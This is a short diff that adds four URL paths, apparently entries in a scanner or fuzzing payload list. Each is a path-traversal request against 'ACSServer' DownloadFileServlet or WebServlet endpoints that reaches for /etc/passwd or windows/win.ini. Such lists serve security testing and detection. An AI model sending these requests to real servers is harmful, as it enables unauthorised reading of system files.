@@ -1,0 +1,4 @@
+/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything
+/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything
+/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd
+/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini
